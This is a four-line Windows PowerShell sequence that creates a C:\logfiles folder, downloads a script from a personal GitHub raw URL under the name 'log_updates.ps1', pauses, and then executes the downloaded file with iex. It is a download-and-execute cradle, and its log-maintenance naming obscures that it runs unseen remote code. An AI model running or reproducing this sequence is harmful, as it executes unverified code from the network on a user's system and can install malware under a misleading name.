powershell -command "New-Item -Path 'c:\' -Name 'logfiles' -ItemType 'directory'"
powershell -command "wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner.ps1 -OutFile C:\logfiles\log_updates.ps1"
Start-Sleep -s 20
powershell -command "iex (Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw)"
